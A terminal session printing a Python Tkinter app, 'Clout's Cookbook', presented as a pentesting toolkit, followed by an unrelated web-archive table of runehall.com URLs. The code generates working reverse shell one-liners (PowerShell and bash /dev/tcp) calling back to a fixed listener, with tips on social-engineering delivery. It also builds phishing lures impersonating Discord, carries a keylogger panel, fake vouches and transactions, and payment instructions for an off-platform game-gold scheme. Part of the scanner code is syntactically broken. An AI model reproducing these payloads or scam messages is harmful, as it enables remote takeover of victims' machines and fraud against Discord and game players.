 cat disckit,py
cat: disckit,py: No such file or directory

┌──(damien㉿LAPTOP-VMGSKJQ0)-[~]
└─$

┌──(damien㉿LAPTOP-VMGSKJQ0)-[~]
└─$ cat disckit.py
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, PhotoImage
import threading
import os
import time
import random
import datetime
import string
from PIL import Image, ImageTk
import requests
from io import BytesIO

class PentestingGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Clout's Cookbook - Pentesting Toolkit")
        self.root.geometry("1200x800")
        self.root.configure(bg="#1e1e1e")

        # Configure styles
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TNotebook', background='#2d2d2d', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#3c3c3c', foreground='white',
                            padding=[10, 5], font=('Arial', 10, 'bold'))
        self.style.map('TNotebook.Tab', background=[('selected', '#0078d7')])

        # Create notebook for tabs
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create tabs
        self.dashboard_tab = ttk.Frame(self.notebook)
        self.marketplace_tab = ttk.Frame(self.notebook)
        self.pentest_tab = ttk.Frame(self.notebook)
        self.keylogger_tab = ttk.Frame(self.notebook)
        self.settings_tab = ttk.Frame(self.notebook)

        self.notebook.add(self.dashboard_tab, text="📊 Dashboard")
        self.notebook.add(self.marketplace_tab, text="💎 Marketplace")
        self.notebook.add(self.pentest_tab, text="💣 Pentesting")
        self.notebook.add(self.keylogger_tab, text="⌨️ Keylogger")
        self.notebook.add(self.settings_tab, text="⚙️ Settings")

        # Initialize data
        self.bot_status = "🟢 Online"
        self.keylog_data = []
        self.transactions = []
        self.vouches = []
        self.tier_prices = {
            "bronze": 10.00,
            "silver": 25.00,
            "gold": 50.00,
            "platinum": 100.00
        }

        # Setup tabs
        self.setup_dashboard()
        self.setup_marketplace()
        self.setup_pentesting()
        self.setup_keylogger()
        self.setup_settings()

        # Start simulated data
        self.update_dashboard_data()
        self.generate_fake_transactions()
        self.generate_fake_vouches()

        # Start keylogger simulation
        self.simulate_keylogger()

    def setup_dashboard(self):
        # Dashboard header
        header_frame = ttk.Frame(self.dashboard_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # Logo
        try:
            response = requests.get("https://i.imgur.com/7X8k3yO.png")
            img_data = Image.open(BytesIO(response.content))
            img_data = img_data.resize((100, 100), Image.LANCZOS)
            self.logo_img = ImageTk.PhotoImage(img_data)
            logo_label = ttk.Label(header_frame, image=self.logo_img)
            logo_label.grid(row=0, column=0, rowspan=2, padx=(0, 20))
        except:
            pass

        title_label = ttk.Label(header_frame, text="Clout's Cookbook Dashboard",
                               font=('Arial', 16, 'bold'), foreground='#0078d7')
        title_label.grid(row=0, column=1, sticky=tk.W)

        status_label = ttk.Label(header_frame, text=f"Status: {self.bot_status}",
                               font=('Arial', 12), foreground='#3adf00')
        status_label.grid(row=1, column=1, sticky=tk.W)

        # Stats frame
        stats_frame = ttk.Frame(self.dashboard_tab)
        stats_frame.pack(fill=tk.X, padx=10, pady=10)

        stats = [
            ("💼 Transactions", "$342.50", "#00b300"),
            ("👥 Members", "87", "#1e90ff"),
            ("⭐ Vouches", "124", "#ffd700"),
            ("💎 Tier Upgrades", "9", "#9b59b6")
        ]

        for i, (title, value, color) in enumerate(stats):
            stat_frame = ttk.Frame(stats_frame, borderwidth=1, relief='solid')
            stat_frame.grid(row=0, column=i, padx=5, pady=5, sticky='nsew')

            ttk.Label(stat_frame, text=title, font=('Arial', 10),
                     foreground='white', background='#3c3c3c').pack(fill=tk.X, padx=5, pady=2)
            ttk.Label(stat_frame, text=value, font=('Arial', 14, 'bold'),
                     foreground=color).pack(padx=5, pady=5)

        # Recent activity frame
        activity_frame = ttk.LabelFrame(self.dashboard_tab, text="Recent Activity")
        activity_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        columns = ("Time", "User", "Action", "Amount")
        self.activity_tree = ttk.Treeview(activity_frame, columns=columns, show='headings', height=8)

        for col in columns:
            self.activity_tree.heading(col, text=col)
            self.activity_tree.column(col, width=150)

        self.activity_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Add sample data
        sample_actions = [
            ("12:34 PM", "OSRS_Pro", "Gold Purchase", "50M ($17.50)"),
            ("12:28 PM", "GoldFarmer", "Account Service", "$25.00"),
            ("12:15 PM", "PvM_King", "Tier Upgrade", "Gold ($50.00)"),
            ("12:05 PM", "IronManBTW", "Raid Carry", "$15.00"),
            ("11:58 AM", "SkillMaster", "Gold Purchase", "100M ($35.00)"),
        ]

        for action in sample_actions:
            self.activity_tree.insert("", tk.END, values=action)

    def setup_marketplace(self):
        # Marketplace header
        header_frame = ttk.Frame(self.marketplace_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        title_label = ttk.Label(header_frame, text="💎 OSRS Marketplace",
                               font=('Arial', 16, 'bold'), foreground='#ff9900')
        title_label.pack(side=tk.LEFT)

        # Services frame
        services_frame = ttk.LabelFrame(self.marketplace_tab, text="Available Services")
        services_frame.pack(fill=tk.X, padx=10, pady=10)

        services = [
            ("💎 Gold Trading", "0.35$/M (Bulk discounts available)"),
            ("⚔️ Powerleveling", "All skills • 99 capes guaranteed"),
            ("🏆 Raid Carries", "ToB/ToA/CoX • All difficulties"),
            ("🛡️ Account Security", "Bank PIN recovery • Hijacked account restoration"),
            ("🎁 Discord Premium", "Nitro 1 Year - $45.99 (LIMITED TIME!)")
        ]

        for title, desc in services:
            service_frame = ttk.Frame(services_frame)
            service_frame.pack(fill=tk.X, padx=5, pady=5)

            ttk.Label(service_frame, text=title, font=('Arial', 11, 'bold'),
                     foreground='#ff9900').pack(anchor=tk.W)
            ttk.Label(service_frame, text=desc).pack(anchor=tk.W)

        # Gold purchase frame
        purchase_frame = ttk.LabelFrame(self.marketplace_tab, text="Buy Gold")
        purchase_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(purchase_frame, text="Amount (M):").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.gold_amount = ttk.Combobox(purchase_frame, values=["1", "10", "50", "100", "500"])
        self.gold_amount.set("10")
        self.gold_amount.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(purchase_frame, text="Price:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.gold_price = ttk.Label(purchase_frame, text="$3.50", font=('Arial', 11, 'bold'),
                                  foreground='#00b300')
        self.gold_price.grid(row=0, column=3, padx=5, pady=5)

        ttk.Button(purchase_frame, text="Purchase",
                  command=self.buy_gold).grid(row=0, column=4, padx=10, pady=5)

        # Tier upgrade frame
        tier_frame = ttk.LabelFrame(self.marketplace_tab, text="Membership Tiers")
        tier_frame.pack(fill=tk.X, padx=10, pady=10)

        tiers = [
            ("🥉 Bronze Tier ($10)", "5% discount • Priority support • Monthly raffle entry"),
            ("🥈 Silver Tier ($25)", "10% discount • 1M monthly gold bonus • Double raffle entries"),
            ("🥇 Gold Tier ($50)", "15% discount • 3M monthly gold bonus • VIP support • Exclusive deals"),
            ("💎 Platinum Tier ($100)", "20% discount • 10M monthly gold bonus • Personal account manager • 24/7 priority support")
        ]

        for i, (title, desc) in enumerate(tiers):
            tier_row = ttk.Frame(tier_frame)
            tier_row.pack(fill=tk.X, padx=5, pady=5)

            ttk.Label(tier_row, text=title, font=('Arial', 11),
                     foreground='#9b59b6').pack(anchor=tk.W)
            ttk.Label(tier_row, text=desc).pack(anchor=tk.W)

            ttk.Button(tier_row, text="Upgrade",
                      command=lambda tier=title.split()[0].lower(): self.upgrade_tier(tier),
                      width=10).pack(side=tk.RIGHT, padx=5)

    def setup_pentesting(self):
        # Pentesting header
        header_frame = ttk.Frame(self.pentest_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        title_label = ttk.Label(header_frame, text="Pentesting Toolkit",
                              font=('Arial', 16, 'bold'), foreground='#ff0000')
        title_label.pack(side=tk.LEFT)

        # Reverse shell frame
        shell_frame = ttk.LabelFrame(self.pentest_tab, text="Reverse Shell Generator")
        shell_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(shell_frame, text="Target:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.target_entry = ttk.Entry(shell_frame, width=25)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5)
        self.target_entry.insert(0, "victim@example.com")

        ttk.Label(shell_frame, text="Platform:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.platform_combo = ttk.Combobox(shell_frame, values=["Windows", "Linux", "Android"])
        self.platform_combo.set("Windows")
        self.platform_combo.grid(row=0, column=3, padx=5, pady=5)

        ttk.Button(shell_frame, text="Generate Payload",
                  command=self.generate_reverse_shell).grid(row=0, column=4, padx=10, pady=5)

        self.shell_output = scrolledtext.ScrolledText(shell_frame, height=8, wrap=tk.WORD)
        self.shell_output.grid(row=1, column=0, columnspan=5, padx=5, pady=5, sticky=tk.EW)
        self.shell_output.insert(tk.END, "Reverse shell payload will appear here...")
        self.shell_output.configure(state='disabled')

        # Scam kit frame
        scam_frame = ttk.LabelFrame(self.pentest_tab, text="Scam Kit")
        scam_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(scam_frame, text="Scam Type:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.scam_combo = ttk.Combobox(scam_frame, values=[
            "Nitro Gift", "Account Verification", "Raffle Winner",
            "Security Alert", "Special Offer"
        ])
        self.scam_combo.set("Nitro Gift")
        self.scam_combo.grid(row=0, column=1, padx=5, pady=5)

        ttk.Button(scam_frame, text="Generate Scam Message",
                  command=self.generate_scam).grid(row=0, column=2, padx=10, pady=5)

        self.scam_output = scrolledtext.ScrolledText(scam_frame, height=8, wrap=tk.WORD)
        self.scam_output.grid(row=1, column=0, columnspan=3, padx=5, pady=5, sticky=tk.EW)
        self.scam_output.insert(tk.END, "Scam message will appear here...")
        self.scam_output.configure(state='disabled')

        # Exploit tools frame
        exploit_frame = ttk.LabelFrame(self.pentest_tab, text="Exploit Tools")
        exploit_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(exploit_frame, text="Domain:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.domain_entry = ttk.Entry(exploit_frame, width=25)
        self.domain_entry.grid(row=0, column=1, padx=5, pady=5)
        self.domain_entry.insert(0, "example.com")

        ttk.Button(exploit_frame, text="Scan for Vulnerabilities",
                  command=self.scan_domain).grid(row=0, column=2, padx=10, pady=5)

        self.exploit_output = scrolledtext.ScrolledText(exploit_frame, height=8, wrap=tk.WORD)
        self.exploit_output.grid(row=1, column=0, columnspan=3, padx=5, pady=5, sticky=tk.EW)
        self.exploit_output.insert(tk.END, "Vulnerability scan results will appear here...")
        self.exploit_output.configure(state='disabled')

    def setup_keylogger(self):
        # Keylogger header
        header_frame = ttk.Frame(self.keylogger_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        title_label = ttk.Label(header_frame, text="Keylogger",
                              font=('Arial', 16, 'bold'), foreground='#ff9900')
        title_label.pack(side=tk.LEFT)

        status_frame = ttk.Frame(header_frame)
        status_frame.pack(side=tk.RIGHT, padx=10)

        ttk.Label(status_frame, text="Status:").pack(side=tk.LEFT, padx=5)
        self.keylogger_status = ttk.Label(status_frame, text="🟢 Active", foreground='#3adf00')
        self.keylogger_status.pack(side=tk.LEFT, padx=5)

        # Keylogger output
        self.keylog_display = scrolledtext.ScrolledText(self.keylogger_tab, wrap=tk.WORD)
        self.keylog_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.keylog_display.insert(tk.END, "Keylogger data will appear here...\n")
        self.keylog_display.configure(state='disabled')

        # Keylogger controls
        control_frame = ttk.Frame(self.keylogger_tab)
        control_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(control_frame, text="Start Keylogger",
                  command=self.start_keylogger).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Stop Keylogger",
                  command=self.stop_keylogger).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Clear Log",
                  command=self.clear_keylog).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Export Log",
                  command=self.export_keylog).pack(side=tk.RIGHT, padx=5)

    def setup_settings(self):
        # Settings header
        header_frame = ttk.Frame(self.settings_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        title_label = ttk.Label(header_frame, text="Settings",
                              font=('Arial', 16, 'bold'), foreground='#0078d7')
        title_label.pack(side=tk.LEFT)

        # Bot settings frame
        bot_frame = ttk.LabelFrame(self.settings_tab, text="Bot Configuration")
        bot_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Label(bot_frame, text="Bot Token:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.token_entry = ttk.Entry(bot_frame, width=50, show="*")
        self.token_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        self.token_entry.insert(0, "YOUR_BOT_TOKEN_HERE")

        ttk.Label(bot_frame, text="Owner ID:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.owner_entry = ttk.Entry(bot_frame, width=20)
        self.owner_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.owner_entry.insert(0, "1293643009505628206")

        ttk.Label(bot_frame, text="Server IP:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.server_entry = ttk.Entry(bot_frame, width=20)
        self.server_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
        self.server_entry.insert(0, "192.168.1.100")

        # Save button
        ttk.Button(bot_frame, text="Save Settings",
                  command=self.save_settings).grid(row=3, column=0, columnspan=2, pady=10)

        # System info frame
        sys_frame = ttk.LabelFrame(self.settings_tab, text="System Information")
        sys_frame.pack(fill=tk.X, padx=10, pady=10)

        info = [
            ("Bot Version:", "Clout's Cookbook v1.2"),
            ("Python Version:", "3.9.6"),
            ("System:", "Windows 10 Pro (64-bit)"),
            ("Uptime:", "2 hours, 15 minutes"),
            ("Active Listeners:", "2 (Ports 8080, 4444)")
        ]

        for i, (label, value) in enumerate(info):
            ttk.Label(sys_frame, text=label, font=('Arial', 10, 'bold')).grid(
                row=i, column=0, padx=5, pady=2, sticky=tk.W)
            ttk.Label(sys_frame, text=value).grid(
                row=i, column=1, padx=5, pady=2, sticky=tk.W)

    def update_dashboard_data(self):
        # Simulate updating dashboard data
        transactions = random.randint(15, 40)
        vouches = random.randint(5, 15)
        upgrades = random.randint(1, 5)

        # Update stats
        stats_frame = self.dashboard_tab.winfo_children()[1]
        for i, widget in enumerate(stats_frame.winfo_children()):
            if i % 2 == 1:  # Value labels
                if i == 1:  # Transactions
                    widget.configure(text=f"${random.randint(200, 500)}")
                elif i == 3:  # Members
                    widget.configure(text=str(random.randint(80, 120)))
                elif i == 5:  # Vouches
                    widget.configure(text=str(vouches))
                elif i == 7:  # Tier Upgrades
                    widget.configure(text=str(upgrades))

        # Add new activity
        users = ["OSRS_Pro", "GoldFarmer", "PvM_King", "SkillMaster", "IronManBTW"]
        actions = ["Gold Purchase", "Account Service", "Tier Upgrade", "Raid Carry", "Nitro Purchase"]
        amounts = ["10M ($3.50)", "25M ($8.75)", "50M ($17.50)", "100M ($35.00)", "Bronze ($10.00)"]

        if random.random() > 0.3:  # 70% chance to add new activity
            time_str = datetime.datetime.now().strftime("%I:%M %p")
            user = random.choice(users)
            action = random.choice(actions)
            amount = random.choice(amounts)

            self.activity_tree.insert("", 0, values=(time_str, user, action, amount))

            # Keep only last 10 items
            if len(self.activity_tree.get_children()) > 10:
                self.activity_tree.delete(self.activity_tree.get_children()[-1])

        # Schedule next update
        self.root.after(5000, self.update_dashboard_data)

    def generate_fake_transactions(self):
        # Generate fake transaction data
        users = ["OSRS_Pro", "GoldFarmer", "PvM_King", "SkillMaster", "IronManBTW"]
        actions = ["gold purchase", "powerleveling", "raid carry", "account service", "Nitro purchase"]

        for _ in range(20):
            user = random.choice(users)
            action = random.choice(actions)
            amount = random.randint(5, 500)
            price = round(amount * random.uniform(0.3, 0.4), 2)
            timestamp = datetime.datetime.now() - datetime.timedelta(minutes=random.randint(1, 1440))

            self.transactions.append(
                f"[{timestamp.strftime('%m/%d %H:%M')}] "
                f"{user} purchased {action} - {amount}M for ${price}"
            )

    def generate_fake_vouches(self):
        # Generate fake vouch data
        adjectives = ["Amazing", "Fast", "Reliable", "Trusted", "Professional", "Quick", "Secure"]
        nouns = ["service", "delivery", "seller", "experience", "transaction", "support"]
        users = ["OSRS_Pro", "GoldFarmer", "PvM_King", "SkillMaster", "IronManBTW"]

        for _ in range(20):
            adj = random.choice(adjectives)
            noun = random.choice(nouns)
            user = random.choice(users)
            amount = random.randint(10, 500)
            days = random.randint(1, 30)

            self.vouches.append(
                f"⭐ {adj} {noun}! Bought {amount}M gold from {user}. "
                f"Delivery took only {random.randint(1, 10)} minutes. "
                f"Will be back for more! - {days} days ago"
            )

    def simulate_keylogger(self):
        if hasattr(self, 'keylogger_running') and self.keylogger_running:
            # Simulate key presses
            chars = string.ascii_letters + string.digits + string.punctuation + " "
            text = ''.join(random.choices(chars, k=random.randint(5, 20)))

            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            log_entry = f"[{timestamp}] {text}\n"

            self.keylog_data.append(log_entry)

            # Update display
            self.keylog_display.configure(state='normal')
            self.keylog_display.insert(tk.END, log_entry)
            self.keylog_display.configure(state='disabled')
            self.keylog_display.yview(tk.END)

        # Schedule next key simulation
        self.root.after(random.randint(1000, 5000), self.simulate_keylogger)

    def generate_reverse_shell(self):
        platform = self.platform_combo.get().lower()
        target = self.target_entry.get()

        payload = ""
        if platform == "windows":
            payload = f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.9.33',8022);" \
                      f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};" \
                      f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;" \
                      f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" \
                      f"$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" \
                      f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
                      f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        elif platform == "linux":
            payload = f"bash -c 'bash -i >& /dev/tcp/192.168.9.33/8022 0>&1'"
        elif platform == "android":
            payload = f"sh -i >& /dev/tcp/192.168.9.33/8022 0>&1"

        self.shell_output.configure(state='normal')
        self.shell_output.delete(1.0, tk.END)
        self.shell_output.insert(tk.END, f"Reverse Shell Payload for {platform.capitalize()}:\n\n")
        self.shell_output.insert(tk.END, payload)
        self.shell_output.insert(tk.END, "\n\n🛡️ PRO TIP: Use URL shorteners and social engineering for delivery!")
        self.shell_output.configure(state='disabled')

        messagebox.showinfo("Payload Generated",
                           f"Reverse shell payload for {platform} has been generated!\n"
                           f"Listener: 192.168.9.33:8022")

    def generate_scam(self):
        scam_type = self.scam_combo.get().lower()
        countries = ["Brazil", "Russia", "India", "China", "Nigeria", "Germany", "USA"]

        scam_text = ""
        if "nitro" in scam_type:
            scam_text = "🎁 **FREE NITRO GIFT!** 🎁\n\n" \
                       "Hey {target}, you've been selected for a **COMPLIMENTARY DISCORD NITRO** gift!\n" \
                       "This is a limited-time offer from Discord Partners.\n\n" \
                       "👉 **CLAIM YOUR GIFT HERE**: \n" \
                       "http://discordgift[.]xyz/claim?user={target}\n\n" \
                       "Hurry, offer expires in 15 minutes! ⏳"
        elif "account" in scam_type:
            scam_text = "⚠️ **ACCOUNT VERIFICATION REQUIRED** ⚠️\n\n" \
                       "Hello {target}, our security system detected unusual activity on your account.\n" \
                       "To prevent suspension, please verify your identity immediately:\n\n" \
                       "🔗 **VERIFY NOW**: \n" \
                       "http://discord-secure[.]com/verify?user={target}\n\n" \
                       "This link expires in 30 minutes. Ignoring may lead to account termination."
        elif "raffle" in scam_type:
            scam_text = "🏆 **YOU'RE A WINNER!** 🏆\n\n" \
                       "Congratulations {target}! You won our monthly raffle for **$500 OSRS GOLD**!\n\n" \
                       "🎁 **CLAIM YOUR PRIZE**: \n" \
                       "http://rune-raffle[.]com/claim?user={target}\n\n" \
                       "Hurry, unclaimed prizes expire in 24 hours!"
        elif "security" in scam_type:
            scam_text = "🚨 **SECURITY ALERT** 🚨\n\n" \
                       "{target}, we detected a login attempt from a new device in {random_country}.\n" \
                       "If this wasn't you, secure your account now:\n\n" \
                       "🔒 **SECURE ACCOUNT**: \n" \
                       "http://discord-protect[.]net/secure?user={target}\n\n" \
                       "Act now to prevent account hijacking!"
        elif "special" in scam_type:
            scam_text = "💎 **EXCLUSIVE OFFER** 💎\n\n" \
                       "{target}, as a valued community member, you get:\n" \
                       "👉 50% OFF OSRS Gold (Only 0.17$/M!)\n" \
                       "👉 FREE 1M Gold Bonus\n" \
                       "👉 Priority Support\n\n" \
                       "🎯 **ACTIVATE OFFER**: \n" \
                       "http://gold-special[.]com/offer?user={target}\n\n" \
                       "Limited to first 50 claims! Expires soon."

        scam_text = scam_text.format(
            target="target_user",
            random_country=random.choice(countries)
        )

        self.scam_output.configure(state='normal')
        self.scam_output.delete(1.0, tk.END)
        self.scam_output.insert(tk.END, scam_text)
        self.scam_output.configure(state='disabled')

        messagebox.showinfo("Scam Generated",
                           f"{scam_type.capitalize()} scam message has been generated!\n"
                           "Delivery Tips:\n• Use burner accounts\n• Spoof official branding\n• Add urgency with timers")

    def scan_domain(self):
        domain = self.domain_entry.get()

        # Simulate scanning
        self.exploit_output.configure(state='normal')
        self.exploit_output.delete(1.0, tk.END)
        self.exploit_output.insert(tk.END, f"Scanning {domain} for vulnerabilities...\n")
        self.exploit_output.update()

        # Simulate scan steps
        steps = [
            f"🔍 Scanning {domain}...",
            "🛰️ Identifying subdomains...",
            "🕵️‍♂️ Checking for open ports...",
            "🔬 Analyzing HTTP headers...",
            "🧪 Testing for XSS vulnerabilities...",
            "💉 Probing for SQL injection points...",
            "📡 Checking CORS misconfigurations...",
            "🔓 Testing for directory traversal..."
        ]

        for step in steps:
            self.exploit_output.insert(tk.END, step + "\n")
            self.exploit_output.update()
            time.sleep(0.5)

        # Simulated results
        results = {
            "critical": random.randint(1, 5),
            "high": random.randint(3, 8),
            "medium": random.randint(5, 12),
            "subdomains": [f"admin.{domain}", f"api.{domain}", f"dev.{domain}", f"mail.{domain}"],
            "vulnerabilities": [
                "SQL Injection - /login.php",
                "XSS Vulnerability - /search?q=<script>",
                "Misconfigured CORS - api.subdomain",
                "Sensitive Data Exposure - /backup.zip"
            ]
        }

        report = (
            f"📊 Scan Report for {domain}\n\n"
            f"🔴 Critical: {results['critical']}\n"
            f"🟠 High: {results['high']}\n"
            f"🟡 Medium: {results['medium']}\n\n"
            "Top Vulnerabilities:\n- " + "\n- ".join(results['vulnerabilities'][:3]) + "\n\n"
            "Subdomains Found:\n" + ", ".join(results['subdomains'])

        self.exploit_output.insert(tk.END, "\n" + report)
        self.exploit_output.configure(state='disabled')

    def start_keylogger(self):
        self.keylogger_running = True
        self.keylogger_status.configure(text="🟢 Active", foreground='#3adf00')
        messagebox.showinfo("Keylogger", "Keylogger started successfully!")

    def stop_keylogger(self):
        self.keylogger_running = False
        self.keylogger_status.configure(text="🔴 Inactive", foreground='#ff0000')
        messagebox.showinfo("Keylogger", "Keylogger stopped.")

    def clear_keylog(self):
        self.keylog_data = []
        self.keylog_display.configure(state='normal')
        self.keylog_display.delete(1.0, tk.END)
        self.keylog_display.insert(tk.END, "Keylog cleared.\n")
        self.keylog_display.configure(state='disabled')

    def export_keylog(self):
        if not self.keylog_data:
            messagebox.showwarning("Export Failed", "No keylog data to export!")
            return

        filename = f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, 'w') as f:
                f.writelines(self.keylog_data)
            messagebox.showinfo("Export Successful", f"Keylog exported to {filename}")
        except Exception as e:
            messagebox.showerror("Export Failed", f"Error exporting keylog: {str(e)}")

    def buy_gold(self):
        amount = self.gold_amount.get()
        if not amount.isdigit():
            messagebox.showerror("Error", "Please enter a valid gold amount!")
            return

        amount = int(amount)
        prices = {
            1: 0.35,
            10: 3.20,
            50: 14.99,
            100: 28.50,
            500: 135.00
        }

        if amount not in prices:
            messagebox.showerror("Error", "Invalid gold amount! Valid amounts: 1, 10, 50, 100, 500")
            return

        price = prices[amount]
        order_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

        messagebox.showinfo("Order Confirmed",
                          f"💸 ORDER #{order_id} CONFIRMED!\n\n"
                          f"Amount: {amount}M OSRS Gold\n"
                          f"Price: ${price:.2f}\n\n"
                          "Next Steps:\n"
                          f"1. Send ${price:.2f} to osrsgold@protonmail.com\n"
                          "2. Include your in-game username in payment notes\n"
                          "3. Gold will be delivered within 5 minutes of payment confirmation")

    def upgrade_tier(self, tier):
        price = self.tier_prices.get(tier, 0)
        if price == 0:
            messagebox.showerror("Error", "Invalid tier selection!")
            return

        messagebox.showinfo("Tier Upgrade",
                          f"⚡ UPGRADE TO {tier.upper()} TIER\n\n"
                          f"Price: ${price:.2f}\n\n"
                          "Payment Instructions:\n"
                          f"1. Send ${price:.2f} via PayPal to runelegends@protonmail.com\n"
                          "2. Include your Discord username in payment notes\n"
                          "3. Your account will be upgraded within 15 minutes\n\n"
                          "Benefits:\n• Exclusive discounts\n• Priority support\n• Monthly bonuses")

    def save_settings(self):
        token = self.token_entry.get()
        owner_id = self.owner_entry.get()
        server_ip = self.server_entry.get()

        if not token or token == "YOUR_BOT_TOKEN_HERE":
            messagebox.showerror("Error", "Please enter a valid bot token!")
            return

        if not owner_id.isdigit():
            messagebox.showerror("Error", "Owner ID must be a numeric value!")
            return

        # In a real app, you would save these settings
        messagebox.showinfo("Settings Saved",
                          "Bot settings have been saved successfully!\n\n"
                          f"Token: {token[:10]}...\n"
                          f"Owner ID: {owner_id}\n"
                          f"Server IP: {server_ip}")

if __name__ == "__main__":
    root = tk.Tk()
    app = PentestingGUI(root)
    root.mainloop()







URL	MIME Type	From	To	Captures	Duplicates	Uniques
http://runehall.com/a/BoooYa	text/html	Dec 16, 2024	Dec 16, 2024	2	0	2
http://runehall.com/assets/index.f5144f28.js	text/html	Jan 2, 2025	Jun 11, 2025	3	0	3
https://runehall.com/a/Alpha	text/html	Feb 25, 2024	Feb 25, 2024	1	0	1
https://runehall.com/a/Black	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/BlightedBets	text/html	Jul 15, 2025	Jul 15, 2025	1	0	1
https://runehall.com/a/Dbuffed	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/DNG	warc/revisit	Dec 27, 2023	Feb 25, 2024	2	0	2
https://runehall.com/a/dorkbet	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/Dovis	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/fiddlydingus	text/html	Jun 28, 2023	Jun 28, 2023	1	0	1
https://runehall.com/a/flashyflashy	text/html	Jan 29, 2025	Mar 28, 2025	2	0	2
https://runehall.com/a/ing	text/html	Sep 12, 2024	Sep 15, 2024	2	0	2
https://runehall.com/a/Johnjok	text/html	Nov 14, 2024	Nov 14, 2024	1	0	1
https://runehall.com/a/loltage	text/html	Nov 26, 2024	Nov 26, 2024	1	0	1
https://runehall.com/a/OSBOT1	text/html	Feb 2, 2023	Jul 4, 2025	11	0	11
https://runehall.com/a/Osbot6m	text/html	Feb 15, 2025	Jul 4, 2025	6	0	6
https://runehall.com/a/osbotbottom	text/html	Feb 25, 2024	Mar 24, 2024	2	0	2
https://runehall.com/a/osbotheader	text/html	Jan 30, 2024	Aug 4, 2024	4	0	4
https://runehall.com/a/osbotheader?view=auth&tab=register	text/html	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/a/PhaserBomb	text/html	Feb 28, 2025	Feb 28, 2025	1	0	1
https://runehall.com/a/rkqz999	text/html	Apr 3, 2023	Apr 3, 2023	1	0	1
https://runehall.com/a/RSGUIDES	text/html	Feb 15, 2025	Jun 13, 2025	2	0	2
https://runehall.com/a/RuneLister	text/html	Feb 25, 2024	Mar 28, 2025	3	0	3
https://runehall.com/a/Sythesports	text/html	Sep 24, 2023	Jun 16, 2024	2	0	2
https://runehall.com/a/Takashi	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/vidas69	text/html	Nov 20, 2024	Nov 20, 2024	1	0	1
https://runehall.com/a/xTwitter	text/html	May 27, 2024	May 27, 2024	1	0	1
https://runehall.com/ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	17	0	17
https://runehall.com/app-ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	16	0	16
https://runehall.com/apple-touch-icon.png	image/png	Jul 23, 2023	Jul 4, 2025	2	0	2
https://runehall.com/assets/18-plus.9123aea5.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/american_roulette.48992306.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/bacca.cbbc35a8.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/basketball.17f13488.png	image/png	Mar 4, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.6e08836c.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.ecc50b10.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/btc.4f29a9c3.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	2	1	1
